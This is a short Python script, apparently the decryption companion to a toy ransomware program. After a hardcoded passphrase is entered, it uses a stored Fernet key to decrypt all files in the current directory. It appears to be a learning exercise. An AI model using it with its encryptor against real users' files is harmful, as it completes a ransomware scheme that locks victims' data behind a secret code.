import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == 'ransomware.py' or file == "secret.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)


with open("secret.key","rb") as k:
    secretKey = k.read()


secretPhrase = "KyHaalHain!!"

user_entry = input("Please enter the secret code : ")

if user_entry == secretPhrase :
    for file in files:
        with open(file,'rb') as theFile :
            content = theFile.read()
        decrypted_content = Fernet(secretKey).decrypt(content); 
            
        with open(file,"wb") as theFile:
            theFile.write(decrypted_content)
    print("Great !! files decrypted")
else:
    print("Wrong Passcode")